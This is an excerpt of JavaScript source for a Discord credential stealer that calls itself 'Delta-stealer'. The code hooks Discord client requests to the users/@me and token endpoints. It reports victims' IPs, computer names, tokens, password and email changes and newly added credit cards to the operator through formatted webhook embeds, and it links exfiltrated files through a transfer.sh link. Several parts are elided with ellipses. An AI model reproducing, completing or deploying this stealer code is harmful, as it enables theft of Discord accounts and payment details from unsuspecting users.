...
const makeEmbed = async ({
    ...
    var params = {
        ...
        avatar_url: "https://static.vecteezy.com/system/resources/thumbnails/010/870/765/small/black-cat-on-transparent-background-free-png.png",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: `©[${config.creator}] | https://github.com/ZekromDev`
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Delta")){
        try{
        fs.rmdirSync(__dirname + "/Delta")
        }catch(err){
            console.log(err)
        }
    var ip = await getIP()
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "Delta-stealer Initialized",
            fields: [{
                name: "Injection Info",
        ...
        if (!user.avatar) var userAvatar = "https://static.vecteezy.com/system/resources/thumbnails/010/870/765/small/black-cat-on-transparent-background-free-png.png"
        if (!user.banner) var userBanner = "https://giffiles.alphacoders.com/254/2549.gif"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Delta-stealer 2024 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/ZekromDev)`,
                inline: !0
            }, {
                name: "Delta Files",
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Delta User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Delta Victim got logged out",
                ...
                fields: [{
                    ...
                    name: "@Copyright",
                    value: `[Delta-Stealer 2024 <:hwkish:1104091524758773822>](https://github.com/ZekromDev)`,
                    inline: !0
                }, {
                    name: "Delta Files",
                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Delta-stealer Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Delta-stealer Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
                        ...
                        name: "@Copyright",
                        value: `[Delta-Stealer 2023 <:hwkish:1104091524758773822>](https://github.com/ZekromDev)`,
                        inline: !0
                    }, {
                        name: "Delta-stealer",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Delta-stealer User Credit Card Added",
                description: `
                Delta Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                **IP:** ${ip}\n\n
